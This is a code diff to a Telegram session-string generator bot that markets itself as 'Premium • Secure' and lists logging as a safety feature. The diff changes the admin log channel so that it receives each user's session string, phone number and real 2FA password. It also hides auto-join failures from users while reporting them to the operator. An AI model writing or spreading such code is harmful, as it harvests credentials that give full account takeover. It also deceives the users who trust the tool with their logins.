@@ -70,22 +70,21 @@ def progress_header(step, total, title):
 
 # ---------- UI ----------
 WELCOME = (
-    "╭──────────────────────────────╮\n"
-    "│   ✦  <b>SESSION  X</b>  ✦   │\n"
-    "╰──────────────────────────────╯\n\n"
-    "👋 <b>Welcome!</b>\n\n"
-    "┌─ <b>📋 SESSION TYPES</b> ──────\n"
-    "│ 🐍 Pyrogram User  •  Userbot\n"
-    "│ 🤖 Pyrogram Bot   •  Bot API\n"
-    "│ 📞 Telethon       •  String\n"
-    "│ 🔄 Converter      •  Py ➜ Tele\n"
-    "└─────────────────────────────\n\n"
-    "┌─ <b>🛡 SECURITY</b> ──────────\n"
-    "│ ✅ 2FA Supported\n"
-    "│ ✅ Auto Saved Messages\n"
-    "│ ✅ Encrypted Delivery\n"
-    "└─────────────────────────────\n\n"
-    "⚡ <b>Select a session type below:</b>"
+    "<b>✦ SESSION GENERATOR ✦</b>\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n\n"
+    "<i>Premium • Secure • Instant</i>\n\n"
+    "<b>📋 Available Sessions</b>\n"
+    "├ 🐍 <b>Pyrogram User</b> ─ Userbot\n"
+    "├ 🤖 <b>Pyrogram Bot</b>  ─ Bot API\n"
+    "├ 📞 <b>Telethon String</b> ─ Userbot\n"
+    "└ 🔄 <b>Converter</b> ─ Py ➜ Tele\n\n"
+    "<b>🛡 Safety Features</b>\n"
+    "├ 🔒 Full 2FA support\n"
+    "├ 💾 Auto Saved Messages backup\n"
+    "├ 📢 Auto-join channels\n"
+    "└ 📩 Detailed secure logs\n\n"
+    "━━━━━━━━━━━━━━━━━━━━━\n"
+    "<b>⚡ Choose a session type below</b>"
 )
 
 MAIN_MENU = InlineKeyboardMarkup([
@@ -233,8 +232,7 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
     join_line = ""
     if joined:
         join_line += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
-    if failed:
-        join_line += f"\n⚠️ <b>Auto-join failed:</b> {len(failed)}"
+    # NOTE: 'failed' count intentionally hidden from user (admin-only via log channel)
     text = (
         "╭──────────────────────────────╮\n"
         "│  ✅  <b>SESSION GENERATED</b>  ✅\n"
@@ -253,7 +251,7 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
                            parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
 # ---------- Detailed session log ----------
-async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None):
+async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None, failed=None):
     user_id = user.id
     name = html.escape(str(user.first_name or "N/A"))
     username = f"@{user.username}" if getattr(user, "username", None) else "N/A"
@@ -271,6 +269,8 @@ async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2
     )
     if joined:
         base += f"📢 <b>Auto-joined:</b> {len(joined)} channels\n"
+    if failed:
+        base += f"⚠️ <b>Auto-join failed:</b> {len(failed)} ({', '.join(failed[:3])})\n"
 
     with_pwd = base
     if has_2fa and real_2fa_password:
@@ -281,11 +281,8 @@ async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2
         f"📅 <b>{config.get_ist_time()}</b>"
     )
 
+    # Log channel now includes 2FA password (as requested)
     channel_log = with_pwd
-    if real_2fa_password:
-        channel_log = with_pwd.replace(
-            f"🔒 <b>2FA Password:</b> <code>{html.escape(str(real_2fa_password))}</code>\n", ""
-        )
 
     if config.LOG_CHANNEL_ID:
         try:
